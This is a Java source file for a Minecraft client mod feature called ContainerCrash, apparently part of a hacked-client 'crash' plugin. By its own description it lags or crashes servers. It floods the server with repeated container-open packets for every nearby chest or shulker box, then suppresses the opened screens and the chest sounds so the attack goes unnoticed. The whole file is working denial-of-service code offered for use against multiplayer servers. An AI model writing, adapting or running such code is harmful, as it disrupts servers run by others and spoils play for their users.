package me.dustin.crash.feature;

import me.dustin.crash.CrashPlugin;
import me.dustin.crash.event.EventPlaySound;
import me.dustin.events.core.EventListener;
import me.dustin.events.core.annotate.EventPointer;
import me.dustin.jex.event.filters.KeyPressFilter;
import me.dustin.jex.event.filters.PlayerPacketsFilter;
import me.dustin.jex.event.filters.TickFilter;
import me.dustin.jex.event.misc.EventKeyPressed;
import me.dustin.jex.event.misc.EventSetScreen;
import me.dustin.jex.event.misc.EventTick;
import me.dustin.jex.event.player.EventPlayerPackets;
import me.dustin.jex.feature.mod.core.Feature;
import me.dustin.jex.feature.option.annotate.Op;
import me.dustin.jex.helper.misc.Wrapper;
import me.dustin.jex.helper.network.NetworkHelper;
import me.dustin.jex.helper.world.WorldHelper;
import net.minecraft.block.AbstractChestBlock;
import net.minecraft.block.Block;
import net.minecraft.block.ShulkerBoxBlock;
import net.minecraft.client.gui.screen.ingame.AbstractInventoryScreen;
import net.minecraft.client.gui.screen.ingame.HandledScreen;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import org.lwjgl.glfw.GLFW;

public class ContainerCrash extends Feature {

    @Op(name = "Packet Count", min = 1, max = 1000, inc = 5)
    public int packetCount = 100;
    @Op(name = "No Sound")
    public boolean noSound = true;
    @Op(name = "Auto Disable")
    public boolean autoDisable = true;

    public ContainerCrash() {
        super(CrashPlugin.CRASH, "Lags/crashes servers by spamming container opening packets. Press escape to toggle.");
    }

    @EventPointer
    private final EventListener<EventPlayerPackets> eventPlayerPacketsEventListener = new EventListener<>(eventPlayerPackets -> {
        for (int x = -4; x < 4; x++) {
            for (int y = -4; y < 4; y++) {
                for (int z = -4; z < 4; z++) {
                    BlockPos blockPos = Wrapper.INSTANCE.getLocalPlayer().getBlockPos().add(x, y, z);
                    Block block = WorldHelper.INSTANCE.getBlock(blockPos);
                    if (block instanceof AbstractChestBlock<?> || block instanceof ShulkerBoxBlock) {
                        BlockHitResult bhr = new BlockHitResult(new Vec3d(blockPos.getX(), blockPos.getY(), blockPos.getZ()), Direction.DOWN, blockPos, false);
                        PlayerInteractBlockC2SPacket openPacket = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr);
                        for (int i = 0; i < packetCount; i++) {
                            NetworkHelper.INSTANCE.sendPacket(openPacket);
                        }
                    }
                }
            }
        }
    }, new PlayerPacketsFilter(EventPlayerPackets.Mode.PRE));

    @EventPointer
    private final EventListener<EventKeyPressed> eventKeyPressedEventListener = new EventListener<>(eventKeyPressed -> {
        setState(false);
    }, new KeyPressFilter(EventKeyPressed.PressType.IN_GAME, GLFW.GLFW_KEY_ESCAPE));

    @EventPointer
    private final EventListener<EventSetScreen> eventSetScreenEventListener = new EventListener<>(eventSetScreen -> {
        if (eventSetScreen.getScreen() == null)
            return;
        if (!Wrapper.INSTANCE.getMinecraft().isPaused() && !(eventSetScreen.getScreen() instanceof AbstractInventoryScreen<?>) && eventSetScreen.getScreen() instanceof HandledScreen<?>) {
            eventSetScreen.setCancelled(true);
            eventSetScreen.setScreen(null);
        }
    });

    @EventPointer
    private final EventListener<EventTick> eventTickEventListener = new EventListener<>(eventTick -> {
        if (Wrapper.INSTANCE.getWorld() == null || Wrapper.INSTANCE.getLocalPlayer() == null && autoDisable)
            setState(false);
    }, new TickFilter(EventTick.Mode.PRE));

    @EventPointer
    private final EventListener<EventPlaySound> eventPacketReceiveEventListener = new EventListener<>(eventPlaySound -> {
        if (!noSound)
            return;
        String sound = eventPlaySound.getIdentifier().toString();
        if (sound.equalsIgnoreCase("minecraft:block.chest.open") || sound.equalsIgnoreCase("minecraft:block.chest.close") || sound.equalsIgnoreCase("minecraft:block.shulker_box.open") || sound.equalsIgnoreCase("minecraft:block.shulker_box.close") || sound.equalsIgnoreCase("minecraft:block.enderchest.open") || sound.equalsIgnoreCase("minecraft:block.enderchest.close"))
            eventPlaySound.cancel();
    });
}
